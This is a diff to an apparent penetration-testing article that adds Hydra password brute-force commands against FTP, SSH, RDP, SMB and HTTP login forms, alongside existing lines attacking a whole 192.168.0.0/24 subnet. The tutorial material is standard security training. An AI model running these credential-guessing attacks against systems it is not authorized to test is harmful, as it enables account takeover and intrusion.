@@ -63,9 +63,48 @@ hydra -l admin -p password ftp://[192.168.0.0/24]/
 hydra -L logins.txt -P pws.txt -M targets.txt ssh
 ```
 
-**This article is a work in progress...**
+Below, I'll list the most common services for carrying out brute-force attacks using **Hydra**
 
+## FTP
 
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> ftp  
+```
 
+## SSH
 
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> ssh
+```
 
+## RDP 
+
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> rdp
+```
+
+## SMBv1
+
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> smb
+```
+
+## SMBv2 & SMBv3
+
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> smb2
+```
+
+## HTTP-GET
+
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> http-get /path/
+```
+
+## HTTP-POST-FORM
+
+```bash
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> http-post-form "/path:username=^USER^&password=^PASS^:Incorrect Username or Password"
+```
+
+Depending on what we're up against, we may need to research the tool more thoroughly or practice to learn how to use it efficiently. The techniques listed above are only the most common ones when performing brute-force attacks with **Hydra**, but they won't always work, so it's best to practice.
